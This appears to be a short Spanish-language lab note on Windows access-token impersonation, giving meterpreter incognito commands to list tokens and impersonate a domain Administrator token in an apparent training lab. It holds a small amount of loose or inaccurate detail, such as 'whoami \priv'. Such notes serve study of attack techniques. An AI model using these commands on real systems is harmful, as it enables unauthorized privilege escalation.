
Es una key o cookie temporal que permite a los usuarios acceder a un sistema o una red sin tener que poner credenciales y es un proceso que se inicia con el sistema. Estos accesos son generados por winlogon.exe.

Hay 2 tipos de seguridad en los Tokens:

- Impersonate-level tokens: son creados como resultado de un login no interactivo en windows y a través de servicios de sistema determinados o domain logons.
- Delegate-level tokens: son creados a través de logins interactivos de windows a través de un login tradicional o un RDP.

Vamos a partir de una sesión de meterpreter. Desde aquí podemos ejecutar los siguientes comandos para acceder a los tokens.

```bash
#Cargamos el módulo incognito dentro de meterpreter
load incognito

#Listamos los tokens del sistema.
list_tokens -u
```

![[Pasted image 20250219094914.png]]

Como se puede observar en el ejemplo hay un "Delegation" token que está disponible.

```bash
#Para poder conectarnos a dicho token ejecutamos este comando
impersonate_token "ATTACKDEFENSE\Administrator"

#Comprobar el usuario
getuid

#Comprobar privs
shell
whoami \priv
```
